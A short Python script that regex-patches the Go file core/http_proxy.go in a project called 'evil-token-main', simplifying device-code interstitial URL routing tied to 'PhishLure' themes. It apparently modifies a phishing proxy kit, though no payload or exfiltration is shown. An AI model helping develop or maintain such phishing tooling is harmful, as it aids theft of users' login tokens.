import re

with open('/Users/macpro14/Downloads/evil-token-main/core/http_proxy.go', 'r') as f:
    content = f.read()

# Replace block 1
content = re.sub(
    r'if dcTheme != "" && dcTheme != "default" \{\n\s*interstitialURL = fmt\.Sprintf\("/access/%s/%s", dcTheme, session\.Id\)\n\s*\} else \{\n\s*interstitialURL = fmt\.Sprintf\("/dc/%s", session\.Id\)\n\s*\}',
    r'interstitialURL = fmt.Sprintf("/dc/%s", session.Id)',
    content
)

# Replace block 2 (around line 3242)
content = re.sub(
    r'if s\.PhishLure\.DeviceCodeTheme != "" && s\.PhishLure\.DeviceCodeTheme != "default" \{\n\s*interstitialURL = fmt\.Sprintf\("/access/%s/%s", s\.PhishLure\.DeviceCodeTheme, s\.Id\)\n\s*\} else \{\n\s*interstitialURL = fmt\.Sprintf\("/dc/%s", s\.Id\)\n\s*\}',
    r'interstitialURL = fmt.Sprintf("/dc/%s", s.Id)',
    content
)

with open('/Users/macpro14/Downloads/evil-token-main/core/http_proxy.go', 'w') as f:
    f.write(content)
print("Done rewriting proxy urls!")
